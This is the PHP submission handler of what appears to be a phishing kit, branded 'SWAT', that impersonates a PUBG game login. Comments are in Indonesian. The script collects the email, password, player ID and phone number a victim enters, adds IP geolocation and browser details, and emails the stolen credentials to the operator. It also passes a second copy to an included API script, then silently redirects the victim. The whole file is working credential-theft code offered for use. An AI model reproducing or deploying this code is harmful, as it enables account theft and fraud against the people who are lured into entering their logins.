<?php
require 'detect.php';
include 'email.php';
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$login = $_POST['login'];




//auth license //

if($email == "" && $password == "" && $phone == "" && $playid == "" && $login == ""){
header("Location: index.php");
}else{
    
    // Topik results, akan muncul dibawah nama sender / nama results
    $topic = "$flag | $callcode_ip | LEVEL $level | $email | $playid | $login | SECURE";
    
    // Isi results yang nanti muncul
    $message = '

    <center> 
        <div border="1" style="border-collapse: collapse; border-color: white; background: url(https://raw.githack.com/swat-cloud-github/web-element/main/header-swat4.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 190px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
        <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Account Information</div>
            <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>EMAIL/USERNAME</th>
                    <th style="width: 60%; text-align: center;"><b>'.$email.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>PASSWORD</th>
                    <th style="width: 60%; text-align: center;"><b>'.$password.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>ID PLAYER</th>
                    <th style="width: 60%; text-align: center;"><b>'.$playid.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>NOMOR HP</th>
                    <th style="width: 60%; text-align: center;"><b>'.$phone.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LEVEL AKUN</th>
                    <th style="width: 60%; text-align: center;"><b>'.$level.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LOGIN DENGAN</th>
                    <th style="width: 60%; text-align: center;"><b>'.$login.'</th> 
                </tr>
            </table>
            <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">More Information</div>
            <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>IP ADDRESS</th>
                    <th style="width: 60%; text-align: center;"><b>'.$ipaddress.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>KODE TELEPON</th>
                    <th style="width: 60%; text-align: center;"><b>'.$callcode_ip.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>CONTINENT</th>
                    <th style="width: 60%; text-align: center;"><b>'.$continent_ip.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>COUNTRY</th>
                    <th style="width: 60%; text-align: center;"><b>'.$country_ip.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>REGION</th>
                    <th style="width: 60%; text-align: center;"><b>'.$region_ip.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>KOTA</th>
                    <th style="width: 78%; text-align: center;"><b>'.$city_ip.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>ZONA WAKTU</th>
                    <th style="width: 78%; text-align: center;"><b>'.$zone.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>PROVIDER</th>
                    <th style="width: 70%; text-align: center;"><b>'.$provider.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>CONTACT</th>
                    <th style="width: 70%; text-align: center;"><a href="https://t.me/BOSS_SWAT">CLICK HERE</a></th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LATITUDE</th>
                    <th style="width: 70%; text-align: center;"><b>'.$lat_ip.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LONGITUDE</th>
                    <th style="width: 70%; text-align: center;"><b>'.$lon_ip.'</th> 
                </tr>
            </table>
            <div style="border-collapse: collapse; border-color: white; width: 294; background: #000; color: #fff; padding: 10px; text-align: left;">Dikirim Pada : '.$jamasuk.'</div>
            <br />
            <table style="border-collapse: collapse; border-color: black; background: #fff; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px;" width="100%" border="1">
                <tr>
                    <th style="width: 100%; text-align: center; font-size: 30px;" height="25px"><b>'.$flag.' '.$country2.'</th>
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 100%; text-align: center; font-size: 13px;" height="25px"><b>© 2020-2022 SWAT All Right Reserved</th>
                </tr>
            </table>
    </center>

    ';

    // Memberikan data perlengkapan email
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
    $headers .= ''.$sender.'' . "\r\n";
    
    // Mengirim Results / Email ke tujuan
    $send = mail($SWAT_EmailRess, $topic, $message, $headers);
    
    // Memberikan action (tindakan) ketika email berhasil terkirim sukses
    if($send) {
        
        echo "<form id='swat' method='POST' action='processing.php'>
                    <input type='hidden' name='email' value='$email'>
              </form>
              <script type='text/javascript'>
                    document.getElementById('swat').submit();
              </script>";
              
    }
}
if($email == "" && $password == "" && $phone == "" && $playid == "" && $login == ""){
header("Location: index.php");
}else{

//Sitemap include //


$msg = ("
[+]=========== ACC PUBG ===========[+]
[Login] = ".$login."
[Email]  = ".$email."
[Pass]  = ".$password."
[Id] = ".$playid."
[phone] = ".$phone."

[+]============System============[+]
[IP INFO] = http://www.geoiptool.com/?IP=".$IP."

[TIME/DATE] =".$times." / ".$date."

[Country] = ".$country."/".$flag."

[FINGERPRINT] = ".$useragent."
");
  

$url = $msg;include("api.php");
    if($url) {
        
        echo "<form id='swat' method='POST' action='processing.php'>
                    <input type='hidden' name='email' value='$email'>
              </form>
              <script type='text/javascript'>
                    document.getElementById('swat').submit();
              </script>";
              
    }
}
?>
